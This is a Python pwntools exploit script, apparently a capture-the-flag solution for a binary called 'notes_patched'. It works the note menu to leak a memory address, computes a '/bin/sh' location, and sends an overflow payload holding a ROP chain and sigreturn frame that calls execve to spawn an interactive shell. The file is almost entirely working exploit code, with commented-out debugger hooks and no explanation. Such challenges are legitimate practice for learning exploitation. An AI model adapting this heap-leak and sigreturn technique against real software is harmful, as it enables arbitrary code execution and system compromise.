#!/bin/python
from pwn import *
import time
exe = ELF('./notes_patched')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.35.so')
p = process(exe.path)
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''
#            
#
#            ''')
#################exploiting#####################
pop_rdi = 0x0000000000401bc0
syscall = 0x0000000000401bc2
leave_ret = 0x0000000000401428
libc_start_main_contain = 0x403fe0
ret = 0x401154

#


 
p.sendlineafter(b'Choice:', b'1')
p.sendafter(b'Note ID:', b'1')
p.sendafter(b'Note Name:', b'lmao')
p.sendlineafter(b'Note Size:', b'64')
p.sendafter(b'Note Content:',b'a')

sleep(2)

p.sendlineafter(b'Choice:', b'1')
p.sendafter(b'Note ID:', b'1')
p.sendafter(b'Note Name:', b'lmao')
p.sendlineafter(b'Note Size:', b'5706')
p.sendlineafter(b'Note Content:',b'/bin/sh\0') 

p.sendlineafter(b'Choice:', b'3')
p.sendlineafter(b'ID:', b'1')
p.recv(1000)
p.recv(1000)
p.recv(1000)
p.recv(1000)
p.recv(1000)
p.recv(1000)
p.recv(555)
p.recv(556)
p.recv(365)
p.recv(132+20+0x10)
leak_addr = u64(p.recv(8))
log.info(f'leak: ' + hex(leak_addr) )
bin_sh = leak_addr +242110 
log.info(f'bin_sh: ' + hex(bin_sh) )
# log.info(b'leak: ' + a )
# context.terminal = ['foot']
# gdb.attach(p, gdbscript='''        
#            # b* 0x0000000000401bc2
#            # b* 0x401070
#            # b*0x7ffff7fc145e
#            b*0x401726
# ''')
p.sendlineafter(b'Choice:', b'1')
p.sendafter(b'Note ID:', b'1')
p.sendafter(b'Note Name:', b'lmao')
p.sendlineafter(b'Note Size:', b'1000')
#

context.clear(arch='amd64')
frame2 = SigreturnFrame()
frame2.rax = 0x3b
frame2.rdi =bin_sh
frame2.rcx = 0
frame2.rsi =0 
frame2.rdx = 0
frame2.rsp = syscall 
frame2.rip = syscall

print_note= 0x40179d
fake_rbp = 0x40179d-0x8
syscall_plt = 0x401070
payload = p64(fake_rbp)
payload += p64(ret)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(0xf)
payload += p64(syscall_plt)
payload += bytes(frame2) 
context.terminal = ['foot']
# gdb.attach(p, gdbscript='''        
#            # b* 0x0000000000401bc2
#            # b* 0x401070
#            b*0x401b56           ''')
#

p.sendafter(b'Note Content:',b'/bin/sh\0'+ b'a'*0x38 +payload )







#
#
#
#
# payload = b'/bin/sh\x00' 
# payload += p64(pop_rdi)
# payload += p64(0xf)
# payload += p64(syscall_plt)
# payload += bytes(frame2) 
# # context.terminal = ['foot']
# # gdb.attach(p, gdbscript='''        
# # # b* 0x0000000000401bc2
# # b*0x0000000000401bc0
# # # b* 0x401070
# # # b*0x401bc1
# # ''')
# sleep(2)
# p.sendafter(b'Sent!\n',payload)
#

##############the end###########################
p.interactive()
